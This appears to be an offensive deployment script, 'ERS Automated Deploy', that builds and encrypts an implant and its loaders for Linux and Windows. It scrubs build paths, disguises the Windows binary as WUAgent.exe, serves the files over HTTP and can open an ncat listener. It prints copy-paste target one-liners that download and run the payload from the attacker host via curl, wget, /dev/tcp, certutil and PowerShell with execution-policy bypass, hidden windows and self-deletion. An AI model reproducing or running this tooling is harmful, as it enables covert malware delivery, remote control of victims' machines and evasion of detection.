#!/bin/bash
# ═══════════════════════════════════════════════════════════════════
#  ERS Automated Deploy — Build + Serve + Generate Target Payloads
# ═══════════════════════════════════════════════════════════════════
#
#  Usage:
#    bash deploy.sh                          # interactive menu
#    bash deploy.sh --linux                  # build + serve Linux loader
#    bash deploy.sh --windows                # build + serve Windows loader
#    bash deploy.sh --both                   # build + serve both
#    bash deploy.sh --both --port 9090       # custom serve port
#    bash deploy.sh --both --listener 443    # also start ncat listener
#
#  Fully automated: builds implant → encrypts → builds loader → serves HTTP
#  Prints ready-to-paste one-liners for the target machine.

set -e

# ── Config ──────────────────────────────────────────────────────────
ROOT="$(cd "$(dirname "$0")" && pwd)"
SERVE_PORT="${SERVE_PORT:-8443}"
LISTENER_PORT=""
BUILD_LINUX=false
BUILD_WINDOWS=false
INTERACTIVE=true
LHOST=""

# ── Parse args ──────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
    case "$1" in
        --linux)    BUILD_LINUX=true; INTERACTIVE=false ;;
        --windows)  BUILD_WINDOWS=true; INTERACTIVE=false ;;
        --both)     BUILD_LINUX=true; BUILD_WINDOWS=true; INTERACTIVE=false ;;
        --port)     SERVE_PORT="$2"; shift ;;
        --listener) LISTENER_PORT="$2"; shift ;;
        --lhost)    LHOST="$2"; shift ;;
        *)          echo "[!] Unknown arg: $1"; exit 1 ;;
    esac
    shift
done

# ── Detect attacker IP ─────────────────────────────────────────────
detect_ip() {
    if [ -n "$LHOST" ]; then
        echo "$LHOST"
        return
    fi
    # Try tun0 (VPN/HTB), then eth0, then first non-lo
    for iface in tun0 eth0 wlan0; do
        local ip=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
        if [ -n "$ip" ]; then echo "$ip"; return; fi
    done
    hostname -I 2>/dev/null | awk '{print $1}'
}

ATTACKER_IP=$(detect_ip)

# ── Colors ──────────────────────────────────────────────────────────
R='\033[0;31m'  G='\033[0;32m'  Y='\033[0;33m'  B='\033[0;34m'
C='\033[0;36m'  W='\033[1;37m'  D='\033[0;90m'  N='\033[0m'

banner() {
    echo -e "${C}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║          ERS Automated Deploy System          ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${N}"
}

# ── Interactive menu ────────────────────────────────────────────────
if $INTERACTIVE; then
    banner
    echo -e "  ${W}Attacker IP:${N} ${G}${ATTACKER_IP}${N}"
    echo -e "  ${W}Serve port:${N}  ${G}${SERVE_PORT}${N}"
    echo ""
    echo -e "  ${W}[1]${N} Deploy Linux loader"
    echo -e "  ${W}[2]${N} Deploy Windows loader"
    echo -e "  ${W}[3]${N} Deploy both"
    echo -e "  ${W}[4]${N} Serve only (skip build)"
    echo ""
    read -rp "  Select [1-4]: " choice
    case "$choice" in
        1) BUILD_LINUX=true ;;
        2) BUILD_WINDOWS=true ;;
        3) BUILD_LINUX=true; BUILD_WINDOWS=true ;;
        4) ;;
        *) echo "[!] Invalid choice"; exit 1 ;;
    esac
    echo ""
fi

# ── Staging directory ──────────────────────────────────────────────
STAGE_DIR="$ROOT/.staging"
mkdir -p "$STAGE_DIR"

# ── Build Linux ─────────────────────────────────────────────────────
build_linux() {
    echo -e "${W}══════════════════════════════════════════${N}"
    echo -e "${G}  Building Linux Loader${N}"
    echo -e "${W}══════════════════════════════════════════${N}"

    cd "$ROOT/ERS/loader"

    # Build implant if needed
    IMPLANT="../implant"
    if [ ! -f "$IMPLANT" ]; then
        echo -e "${Y}[*]${N} Building ERS implant..."
        cd "$ROOT/ERS"
        if [ -f build.sh ]; then
            bash build.sh
        else
            cargo build --release
            cp target/release/ers-loader ../implant 2>/dev/null || \
            cp target/release/ers ../implant 2>/dev/null || true
        fi
        cd "$ROOT/ERS/loader"
    fi

    if [ ! -f "$IMPLANT" ]; then
        echo -e "${R}[!]${N} No implant binary found at $IMPLANT"
        echo -e "${Y}[*]${N} Build it manually first, then re-run deploy"
        return 1
    fi

    echo -e "${Y}[*]${N} Implant: $(du -h "$IMPLANT" | cut -f1)"

    # Encrypt with fresh random padding (unique hash)
    echo -e "${Y}[*]${N} Encrypting payload (fresh hash)..."
    python3 encrypt_payload.py "$IMPLANT"

    # Build loader
    echo -e "${Y}[*]${N} Compiling loader..."
    RUSTFLAGS="--remap-path-prefix=$HOME=. --remap-path-prefix=$(pwd)=." \
      cargo build --release 2>&1 | tail -3

    # Copy + scrub
    cp target/release/ers-loader "$STAGE_DIR/update"
    chmod +x "$STAGE_DIR/update"

    python3 -c "
data = bytearray(open('$STAGE_DIR/update','rb').read())
for old, new in [(b'/rustc/',b'\x00'*7),(b'/home/',b'\x00'*6),(b'.cargo/registry/',b'\x00'*16)]:
    idx = 0
    while True:
        idx = data.find(old, idx)
        if idx == -1: break
        data[idx:idx+len(old)] = new
        idx += len(new)
open('$STAGE_DIR/update','wb').write(data)
" 2>/dev/null

    echo -e "${G}[+]${N} Linux loader ready: $(du -h "$STAGE_DIR/update" | cut -f1)"
}

# ── Build Windows ───────────────────────────────────────────────────
build_windows() {
    echo -e "${W}══════════════════════════════════════════${N}"
    echo -e "${G}  Building Windows Loader${N}"
    echo -e "${W}══════════════════════════════════════════${N}"

    cd "$ROOT/ERS-W/loader"

    IMPLANT="../ers-w.exe"
    if [ ! -f "$IMPLANT" ]; then
        echo -e "${Y}[*]${N} Building ERS-W implant..."
        cd "$ROOT/ERS-W"
        if [ -f build.sh ]; then
            bash build.sh
        else
            cargo build --release --target x86_64-pc-windows-gnu
            cp target/x86_64-pc-windows-gnu/release/ers-w.exe ../ers-w.exe 2>/dev/null || true
        fi
        cd "$ROOT/ERS-W/loader"
    fi

    if [ ! -f "$IMPLANT" ]; then
        echo -e "${R}[!]${N} No implant binary found at $IMPLANT"
        echo -e "${Y}[*]${N} Build it manually first, then re-run deploy"
        return 1
    fi

    echo -e "${Y}[*]${N} Implant: $(du -h "$IMPLANT" | cut -f1)"

    echo -e "${Y}[*]${N} Encrypting payload (fresh hash)..."
    python3 encrypt_payload.py "$IMPLANT"

    echo -e "${Y}[*]${N} Cross-compiling for Windows..."
    RUSTFLAGS="--remap-path-prefix=$HOME=. --remap-path-prefix=$(pwd)=." \
      cargo build --release --target x86_64-pc-windows-gnu 2>&1 | tail -3

    cp target/x86_64-pc-windows-gnu/release/ers-w-loader.exe "$STAGE_DIR/WUAgent.exe"

    python3 -c "
data = bytearray(open('$STAGE_DIR/WUAgent.exe','rb').read())
for old, new in [(b'/rustc/',b'\x00'*7),(b'/home/',b'\x00'*6),(b'.cargo/registry/',b'\x00'*16)]:
    idx = 0
    while True:
        idx = data.find(old, idx)
        if idx == -1: break
        data[idx:idx+len(old)] = new
        idx += len(new)
open('$STAGE_DIR/WUAgent.exe','wb').write(data)
" 2>/dev/null

    echo -e "${G}[+]${N} Windows loader ready: $(du -h "$STAGE_DIR/WUAgent.exe" | cut -f1)"
}

# ── Generate one-liners ────────────────────────────────────────────
print_oneliners() {
    echo ""
    echo -e "${C}══════════════════════════════════════════════════${N}"
    echo -e "${W}  TARGET ONE-LINERS  ${D}(copy-paste to target)${N}"
    echo -e "${C}══════════════════════════════════════════════════${N}"

    if [ -f "$STAGE_DIR/update" ]; then
        echo ""
        echo -e "  ${G}── Linux ──────────────────────────────────────${N}"
        echo ""
        echo -e "  ${W}curl (quiet):${N}"
        echo -e "  ${Y}curl -sk http://${ATTACKER_IP}:${SERVE_PORT}/update -o /tmp/.dbus-helper && chmod +x /tmp/.dbus-helper && /tmp/.dbus-helper &${N}"
        echo ""
        echo -e "  ${W}wget:${N}"
        echo -e "  ${Y}wget -q http://${ATTACKER_IP}:${SERVE_PORT}/update -O /tmp/.dbus-helper && chmod +x /tmp/.dbus-helper && /tmp/.dbus-helper &${N}"
        echo ""
        echo -e "  ${W}Pure bash (no curl/wget):${N}"
        echo -e "  ${Y}bash -c 'cat < /dev/tcp/${ATTACKER_IP}/${SERVE_PORT}/update > /tmp/.x && chmod +x /tmp/.x && /tmp/.x &'${N}"
        echo ""
        echo -e "  ${W}Background + self-delete:${N}"
        echo -e "  ${Y}cd /tmp && curl -sk http://${ATTACKER_IP}:${SERVE_PORT}/update -o .u && chmod +x .u && (nohup ./.u &>/dev/null &) && sleep 1 && rm -f .u${N}"
        echo ""
    fi

    if [ -f "$STAGE_DIR/WUAgent.exe" ]; then
        echo ""
        echo -e "  ${G}── Windows (PowerShell) ────────────────────────${N}"
        echo ""
        echo -e "  ${W}IWR (default):${N}"
        echo -e "  ${Y}iwr http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe -OutFile \$env:TEMP\\WUAgent.exe; Start-Process \$env:TEMP\\WUAgent.exe -WindowStyle Hidden${N}"
        echo ""
        echo -e "  ${W}certutil:${N}"
        echo -e "  ${Y}certutil -urlcache -split -f http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe %TEMP%\\WUAgent.exe && start /b %TEMP%\\WUAgent.exe${N}"
        echo ""
        echo -e "  ${W}PowerShell (bypass + hidden):${N}"
        echo -e "  ${Y}powershell -ep bypass -w hidden -c \"iwr http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe -OutFile \$env:TEMP\\WUAgent.exe; Start-Process \$env:TEMP\\WUAgent.exe\"${N}"
        echo ""
        echo -e "  ${W}Download + run + self-delete:${N}"
        echo -e "  ${Y}powershell -ep bypass -w hidden -c \"\$p=\$env:TEMP+'\\WUAgent.exe';iwr http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe -OutFile \$p;Start-Process \$p -WindowStyle Hidden;Start-Sleep 5;Remove-Item \$p -Force\"${N}"
        echo ""
    fi

    echo -e "  ${D}─────────────────────────────────────────────────${N}"
    echo -e "  ${W}Server:${N} http://${ATTACKER_IP}:${SERVE_PORT}/"
    echo ""
}

# ── Serve files ─────────────────────────────────────────────────────
serve_files() {
    echo -e "${C}══════════════════════════════════════════════════${N}"
    echo -e "${W}  HTTP Server${N}"
    echo -e "${C}══════════════════════════════════════════════════${N}"

    ls -la "$STAGE_DIR/" 2>/dev/null
    echo ""

    # Kill any existing server on the port
    fuser -k "${SERVE_PORT}/tcp" 2>/dev/null || true
    sleep 0.5

    echo -e "${G}[+]${N} Serving on http://${ATTACKER_IP}:${SERVE_PORT}/"
    echo -e "${D}    Press Ctrl+C to stop${N}"
    echo ""

    print_oneliners

    # Start listener in background if requested
    if [ -n "$LISTENER_PORT" ]; then
        echo -e "${G}[+]${N} Starting ncat listener on port ${LISTENER_PORT}..."
        ncat --ssl -lvp "$LISTENER_PORT" &
        LISTENER_PID=$!
        echo -e "${G}[+]${N} Listener PID: $LISTENER_PID"
        echo ""
    fi

    # Serve with logging
    cd "$STAGE_DIR"
    python3 -c "
import http.server, socketserver, sys, os
from datetime import datetime

class QuietHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        ts = datetime.now().strftime('%H:%M:%S')
        client = self.client_address[0]
        # Color the download events
        msg = fmt % args
        if '200' in msg:
            print(f'  \033[0;32m[{ts}]\033[0m {client} => {msg}')
        elif '404' in msg:
            print(f'  \033[0;31m[{ts}]\033[0m {client} => {msg}')
        else:
            print(f'  \033[0;90m[{ts}]\033[0m {client} => {msg}')
        sys.stdout.flush()

    def end_headers(self):
        self.send_header('Content-Disposition', 'attachment')
        self.send_header('Cache-Control', 'no-store')
        super().end_headers()

PORT = int(sys.argv[1])
with socketserver.TCPServer(('0.0.0.0', PORT), QuietHandler) as httpd:
    httpd.serve_forever()
" "$SERVE_PORT"
}

# ── Cleanup on exit ────────────────────────────────────────────────
cleanup() {
    echo ""
    echo -e "${Y}[*]${N} Cleaning up staging directory..."
    rm -rf "$STAGE_DIR"
    if [ -n "$LISTENER_PID" ]; then
        kill "$LISTENER_PID" 2>/dev/null
    fi
    echo -e "${G}[+]${N} Done."
}
trap cleanup EXIT

# ── Main ────────────────────────────────────────────────────────────
banner

echo -e "  ${W}Attacker IP:${N} ${G}${ATTACKER_IP}${N}"
echo -e "  ${W}Serve port:${N}  ${G}${SERVE_PORT}${N}"
if [ -n "$LISTENER_PORT" ]; then
    echo -e "  ${W}Listener:${N}    ${G}${LISTENER_PORT}${N}"
fi
echo ""

$BUILD_LINUX && build_linux
$BUILD_WINDOWS && build_windows

# Always serve if we have anything staged
if ls "$STAGE_DIR"/* &>/dev/null; then
    serve_files
else
    echo -e "${R}[!]${N} Nothing in staging directory to serve."
    echo -e "${Y}[*]${N} Run with --linux, --windows, or --both to build first."
    exit 1
fi
